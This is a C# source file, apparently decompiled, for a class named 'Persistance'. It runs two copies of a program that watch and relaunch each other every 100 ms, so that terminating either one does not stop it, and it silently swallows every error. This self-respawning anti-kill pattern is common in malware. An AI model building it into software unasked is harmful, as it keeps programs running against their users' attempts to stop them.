using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

internal class Persistance
{
	private Thread thread;

	private string name;

	private string hash;

	private bool running;

	private bool _exit;

	private int _interval;

	public string CurrentHash => hash;

	public bool IsRunning => running;

	public bool IsWatcher
	{
		get
		{
			if (Environment.GetCommandLineArgs().Length > 1)
			{
				return Operators.CompareString(Environment.GetCommandLineArgs()[1], hash, false) == 0;
			}
			return false;
		}
	}

	public int Interval
	{
		get
		{
			return _interval;
		}
		set
		{
			_interval = value;
		}
	}

	public Persistance()
	{
		thread = new Thread(MainLoop);
		name = Process.GetCurrentProcess().ProcessName;
		hash = GetProcessHash(Process.GetCurrentProcess());
		running = false;
		_exit = false;
		_interval = 100;
	}

	public void Start()
	{
		if (!running)
		{
			running = true;
			thread = new Thread(MainLoop);
			thread.Start();
		}
	}

	public void Stop()
	{
		if (!IsWatcher)
		{
			running = false;
		}
	}

	public void Exit()
	{
		_exit = true;
		Stop();
	}

	public void KillWatchers()
	{
		try
		{
			if (IsWatcher)
			{
				return;
			}
			Process[] processesByName = Process.GetProcessesByName(name);
			foreach (Process process in processesByName)
			{
				if (process.Id != Process.GetCurrentProcess().Id && Operators.CompareString(GetProcessHash(process), hash, false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void SingleInstance()
	{
		try
		{
			if (CountProcesses() > 2)
			{
				Environment.Exit(0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string GetProcessHash(Process p)
	{
		try
		{
			if (!p.HasExited && File.Exists(p.MainModule!.FileName))
			{
				FileInfo fileInfo = new FileInfo(p.MainModule!.FileName);
				return checked(fileInfo.Length + fileInfo.CreationTime.Second).ToString();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return string.Empty;
	}

	private int CountProcesses()
	{
		int num = 0;
		try
		{
			Process[] processesByName = Process.GetProcessesByName(name);
			foreach (Process p in processesByName)
			{
				if (Operators.CompareString(GetProcessHash(p), hash, false) == 0)
				{
					num = checked(num + 1);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return num;
	}

	private void MainLoop()
	{
		try
		{
			while (running)
			{
				if (CountProcesses() < 2 && File.Exists(name + ".exe"))
				{
					if (IsWatcher)
					{
						Process.Start(name);
					}
					else
					{
						Process.Start(name, hash);
					}
				}
				Thread.Sleep(_interval);
			}
			KillWatchers();
			if (_exit)
			{
				Environment.Exit(0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
